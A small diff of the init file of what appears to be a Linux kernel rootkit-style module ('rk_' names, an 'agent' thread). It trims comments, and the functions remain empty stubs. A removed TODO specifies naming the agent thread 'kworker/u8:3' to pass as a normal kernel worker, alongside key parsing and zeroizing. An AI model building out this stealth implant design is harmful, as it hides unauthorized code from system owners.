@@ -1,7 +1,5 @@
 // SPDX-License-Identifier: GPL-2.0
-/*
- * core/init.c - Module initialization: key parsing and agent thread launch.
- */
+// core/init.c - Module initialization: key parsing and agent thread launch.
 #include <linux/hex.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
@@ -20,23 +18,13 @@ static struct task_struct *rk_thread;
 
 static int __init rk_init(void)
 {
-	/*
-	 * TODO:
-	 * 1. Validate and parse rk_key_hex into rk_key with hex2bin.
-	 * 2. Zeroize rk_key_hex with memzero_explicit.
-	 * 3. Start the agent kthread with kthread_run (name: "kworker/u8:3").
-	 * 4. On kthread failure, zeroize rk_key and return the error.
-	 */
+	// Parse hex key, zeroize the hex copy, start the agent thread.
 	return -ENOSYS;
 }
 
 static void __exit rk_exit(void)
 {
-	/*
-	 * TODO:
-	 * 1. Stop the kthread if running.
-	 * 2. Zeroize rk_key with memzero_explicit.
-	 */
+	// Stop the agent thread, zeroize key material.
 }
 
 module_init(rk_init);
